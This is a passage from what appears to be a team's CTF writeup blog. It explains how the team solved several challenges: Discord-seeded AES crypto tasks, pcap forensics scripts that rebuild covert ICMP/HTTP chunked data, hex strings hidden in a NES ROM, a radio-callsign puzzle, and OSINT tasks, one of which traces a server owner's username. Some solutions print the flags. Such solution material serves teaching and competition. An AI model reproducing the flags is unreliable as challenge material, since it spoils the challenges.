<a href="https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu&amp;g_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==">https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu&g_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==</a></p>
<p>This link led us to the ARChA building at the University of Timi»ôoara. There, we uncovered the final piece of the puzzle:
<img alt="alt text" loading="lazy" src="/images/qrcode-onions2.png"></p>
<p>Overall, Onions2 was a great mix of digital forensics, hidden services, and creative problem-solving.</p>
<h3 id="disco-dance">Disco Dance<a hidden class="anchor" aria-hidden="true" href="#disco-dance">#</a></h3>
<p>This challenge provided two attached services, one in Python and one in TypeScript, with the goal of encrypting the flag using a random seed.</p>
<p>The interesting part, however, is in the Python code, since the TypeScript service (besides not being vulnerable) only had the task of proxying HTTP requests from the Python server to Discord, while adding a private Discord bot token.</p>
<p>In the Python server, two functions can be noted:</p>
<ul>
<li>The <code>get_random</code> function, which reads 5 messages from the channel with id <code>1416908413375479891</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;https://proxy-gamma-steel-32.vercel.app/api/proxy/channels/1416908413375479891/messages?limit=5&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Bot </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;TOKEN&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">messages</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">concatenated</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="s2">&#34;content&#34;</span><span class="p">]</span> <span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">messages</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">concatenated</span>
</span></span></code></pre></div><ul>
<li>And the <code>encrypt</code> function, whose purpose is to encrypt the flag using the messages obtained from <code>get_random</code> as the key for <strong>AES CBC</strong>, after hashing them with SHA256.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">digest</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">digest</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">padded_data</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">padded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">ciphertext</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="solution-3">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-3">#</a></h4>
<p>To solve this challenge, we reasoned that in order to obtain the key it was necessary to have access to the Discord channel and, while exploring the CTF server, we noticed the <code>spam</code> channel where participants occasionally sent exactly 5 messages.</p>
<p>We then confirmed that the ID matched, and we simply contacted the service to have it encrypt the flag with a key we generated ourselves.</p>
<h3 id="disco-rave">Disco Rave<a hidden class="anchor" aria-hidden="true" href="#disco-rave">#</a></h3>
<p>To fully understand this writeup, it is recommended to first read the writeup for <code>Disco Dance</code>, since the general reasoning has already been explained there.</p>
<p>The only changed behavior here is in the <code>get_random</code> function. In this challenge, it reads the latest 10 messages from the channels <code>1416908413375479891</code> (<strong>spam</strong>) and <code>1417154025371209852</code> (<strong>spam_plus_plus</strong>), then returns a single string containing the timestamps and messages, ordered first from <code>spam</code> and then from <code>spam_plus_plus</code>, to be used as the AES key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">channels</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;1416908413375479891&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;1417154025371209852&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Bot </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;TOKEN&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">all_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">channel_id</span> <span class="ow">in</span> <span class="n">channels</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;https://proxy-gamma-steel-32.vercel.app/api/proxy/channels/</span><span class="si">{</span><span class="n">channel_id</span><span class="si">}</span><span class="s2">/messages?limit=10&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">messages</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">messages</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">timestamp</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;timestamp&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">all_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">content</span><span class="si">}{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">concatenated</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">all_data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">concatenated</span>
</span></span></code></pre></div><h4 id="solution-4">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-4">#</a></h4>
<p>By following the same procedure as in <code>Disco Dance</code>, it is possible to obtain the flag by decrypting it with the AES key derived from our own Discord messages.</p>
<h2 id="forensics-">Forensics ü§ñ<a hidden class="anchor" aria-hidden="true" href="#forensics-">#</a></h2>
<h3 id="unknown-traffic-1">Unknown Traffic 1<a hidden class="anchor" aria-hidden="true" href="#unknown-traffic-1">#</a></h3>
<p>This challenge had an attached <code>pcap</code> file containing several packets with the sole purpose of adding noise to the transport of the flag.
After looking for a while at the various possible flows (HTTP, UDP, DNS, FTP), we noticed that the ICMP flows had inconsistencies compared to the others, since the data sent in the body of the requests had two formats:</p>
<ul>
<li>Hexadecimal data with a small payload at the end (about 2 bytes)</li>
<li>Unclear ASCII strings</li>
</ul>
<p>To find the flag, we therefore gathered the data into two separate strings and, in the first case, we removed the noise (null bytes), then tried to decode them on cyberchef.org.</p>
<p>Here we noticed that the ASCII string was actually the flag encoded in base64.</p>
<h4 id="python-script">Python script<a hidden class="anchor" aria-hidden="true" href="#python-script">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pyshark</span><span class="o">,</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">traffic</span> <span class="o">=</span> <span class="n">pyshark</span><span class="o">.</span><span class="n">FileCapture</span><span class="p">(</span><span class="s1">&#39;unknown-traffic1.pcap&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">full_data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">FLAGRE</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;ctf{[a-f0-9]+}&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">traffic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;ICMP&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">packet</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">icmp</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;00&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">full_data</span> <span class="o">+=</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">full_data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">FLAGRE</span><span class="p">,</span> <span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span></span></code></pre></div><h3 id="unknown-traffic-2">Unknown Traffic 2<a hidden class="anchor" aria-hidden="true" href="#unknown-traffic-2">#</a></h3>
<p>This challenge came with a <code>pcap</code> file (<code>traffic.pcap</code>) containing mixed HTTP and ICMP packets, where the objective was to reconstruct a file split across multiple chunks.
By analyzing the traffic, we quickly noticed two distinct ways the payload fragments were embedded:</p>
<ul>
<li>In the HTTP requests, the query string carried base64 data in the form: <code>GET /data?chunk=N&amp;data=...</code></li>
<li>In the ICMP packets, the payloads included ASCII markers such as: <code>CHUNK_N:...</code></li>
</ul>
<p>After extracting these sequences, we observed that each <code>chunk</code> index corresponded to a specific part of the file. Some chunks appeared multiple times with overlapping data; in those cases, the longest version was preserved.</p>
<p>The reconstruction process followed these steps:</p>
<ol>
<li>Parse the pcap as text (<code>latin-1</code>) and match both encodings with regular expressions.</li>
<li>Collect the fragments and merge them according to their <code>chunk</code> index.</li>
<li>Concatenate all parts in ascending order into a single base64 string.</li>
<li>Decode the final base64 blob, adding padding when required.</li>
<li>Write the result to <code>decrypt.bin</code>.</li>
</ol>
<p>The recovered file turned out to be a QR code PNG image (<code>680√ó680 RGBA</code>).</p>
<p>To simplify the extraction, we avoided heavy dependencies (e.g. <code>pyshark</code>) and instead used a minimal script with only <code>re</code> and <code>base64</code>. This script automatically scans the pcap, gathers both HTTP and ICMP chunks, merges them, and produces the final binary.</p>
<h4 id="python-solution-1">Python solution<a hidden class="anchor" aria-hidden="true" href="#python-solution-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s1">&#39;traffic.pcap&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;latin-1&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">http_pat</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;GET /data\?chunk=(\d+)&amp;data=([^\s]+)\s+HTTP/1.1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">icmp_pat</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;CHUNK_(\d+):([A-Za-z0-9+/]+)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">chunks</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">http_pat</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="p">,</span> <span class="n">s</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunks</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span> <span class="k">else</span> <span class="n">chunks</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">icmp_pat</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="p">,</span> <span class="n">s</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunks</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span> <span class="k">else</span> <span class="n">chunks</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">chunks</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">raw</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">Path</span><span class="p">(</span><span class="s1">&#39;decrypt.bin&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="note">Note<a hidden class="anchor" aria-hidden="true" href="#note">#</a></h4>
<p>In this script is not included how to scan a qr code since it can be done with any utility online/offline.</p>
<h3 id="hidden-in-the-cartridge">Hidden in the Cartridge<a hidden class="anchor" aria-hidden="true" href="#hidden-in-the-cartridge">#</a></h3>
<p>This challenge shipped a NES ROM: <code>space_invaders.nes</code>. The flag was hidden directly in the cartridge data among otherwise normal-looking bytes.</p>
<p>After dumping printable strings (e.g., with <code>strings</code>, a hex editor, or a quick script), one pattern stood out: long runs of <strong>two hex digits separated by <code>$$$</code></strong>, for example:</p>
<pre tabindex="0"><code>63$$$74$$$66$$$7b ... 30$$$7d
</code></pre><p>Two details made these sequences suspicious:</p>
<ul>
<li>They follow a strict form: <code>[0-9a-f]{2}</code> repeated, always separated by <code>$$$</code>.</li>
<li>The very first decoded bytes line up with <code>63 74 66 7b</code> -&gt; <code>c t f {</code>, and the final block ends with <code>7d</code> -&gt; <code>}</code>.</li>
</ul>
<p>To recover the flag, we collected all such <code>$$$</code>-separated hex blocks in order, split each on <code>$$$</code>, converted every two-digit hex chunk to a byte, decoded as text, and concatenated the results. The combined plaintext is the flag.</p>
<h4 id="python-script-1">Python script<a hidden class="anchor" aria-hidden="true" href="#python-script-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;space_invaders.nes&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;latin-1&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(?:[0-9a-fA-F]</span><span class="si">{2}</span><span class="s1">(?:\$\$\$[0-9a-fA-F]</span><span class="si">{2}</span><span class="s1">)+)&#39;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">matches</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">decoded</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">matches</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;$$$&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;latin-1&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
</span></span></code></pre></div><p>This prints the recovered <code>ctf{...}</code> token extracted from the ROM.</p>
<h3 id="baofeng">Baofeng<a hidden class="anchor" aria-hidden="true" href="#baofeng">#</a></h3>
<p>This challenge required finding the <code>callsign</code> and the <code>name</code> of a city from a radio communication made with a Baofeng, attached as an mp3.</p>
<p>After listening to the communication a couple of times, we decided to look for a tool, or create a band-pass filter, to remove all the excess noise.
After doing this, even though we didn‚Äôt understand what was being said in the audio, we used an AI to convert <strong>audio</strong> -&gt; <strong>text</strong>.</p>
<p>In this way, we obtained this text:</p>
<pre tabindex="0"><code>CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra. My QTH is Kilo November 15, Kilo Sierra. CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra.
</code></pre><p>Thanks to this transcription, we understood that the location (aka <strong><code>QTH</code></strong>) was <code>KN15KS</code>, which is the code of the city to find, while the callsign was &ldquo;<em>Yankee Oscar 2, Tango Sierra Sierra</em>&rdquo; which, transformed into NATO code, became <strong>YO2TSS</strong>, the first part of the flag.</p>
<p>To find the second part of the flag, it was enough to search the code <code>KN15KS</code> on a <em>Maidenhead grid</em> to find the city name, which was <strong><code>Hunedoara</code></strong>.</p>
<p>Putting it all together, the flag became <code>ctf{yo2tss_hunedoara}</code>.</p>
<h3 id="3rd-child">3rd child<a hidden class="anchor" aria-hidden="true" href="#3rd-child">#</a></h3>
<p>Short audio forensics task involving spectral text hidden in an audio channel.</p>
<h4 id="challenge-description">Challenge description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h4>
<blockquote>
<p>My 3rd child believes in ghosts. I don&rsquo;t know how to prove they aren&rsquo;t real.</p></blockquote>
<p>‚ÄúGhosts‚Äù ‚Üí look for something you don&rsquo;t normally hear but can still be <em>seen</em> (spectrogram).</p>
<h4 id="provided-file">Provided file<a hidden class="anchor" aria-hidden="true" href="#provided-file">#</a></h4>
<p><code>output.wav</code></p>
<p>Analyzing <code>output.wav</code> in Audacity shows three distinct components: broadband noise, a music bed, and another track.
The challenge description suggests that we should visualize the spectrogram of the last layer.</p>
<p><img alt="alt text" loading="lazy" src="/images/3rdchild.png"></p>
<h2 id="osint-">OSINT üåè<a hidden class="anchor" aria-hidden="true" href="#osint-">#</a></h2>
<h3 id="holiday-trip">Holiday Trip<a hidden class="anchor" aria-hidden="true" href="#holiday-trip">#</a></h3>
<p>This OSINT challenge required finding the location of the shop shown in the image.</p>
<p>After some research using Google Lens and ChatGPT, we were at a dead end. However, we noticed a cup in the top left corner of the image with <strong><code>Golden_Sands</code></strong> written on it. We decided to try it as the flag and we solved the challenge.</p>
<h3 id="prison">Prison<a hidden class="anchor" aria-hidden="true" href="#prison">#</a></h3>
<p>This OSINT challenge required finding both the server host and the owner‚Äôs name of a Minecraft server. The only clue was an image showing several player nicknames and roles.</p>
<p>From the image, I noticed the owner‚Äôs username started with &ldquo;Leaky_&rdquo;, and there were other players with roles like &ldquo;srwarden&rdquo;, &ldquo;warden&rdquo;, &ldquo;guard&rdquo;, and &ldquo;srguard&rdquo;. Some of the visible player names included PsychNOdelic, ButterInc, Cheese, and Dragon. The server itself had a prison-themed appearance.</p>
<p>To dig deeper, I used the deep research function of ChatGPT with this prompt:</p>
<blockquote>
<p>Can you find a Minecraft server where the owner&rsquo;s name starts with Leaky_ and there are other players with roles like &ldquo;srwarden&rdquo;, &ldquo;warden&rdquo;, &ldquo;guard&rdquo;, &ldquo;srguard&rdquo; and names PsychNOdelic, ButterInc, Cheese, Dragon? The server seems prison-based.</p></blockquote>
<p>After some time, ChatGPT found a server called <strong>play.thepen-mc.net</strong>. On their Discord, I was able to confirm the owner‚Äôs full username: <strong>Leaky_Tandos</strong>.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://pascalctf.github.io/en/tags/ctfatac/">Ctfatac</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/ctf/">Ctf</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/binary/">Binary</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/crypto/">Crypto</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/web/">Web</a></li>
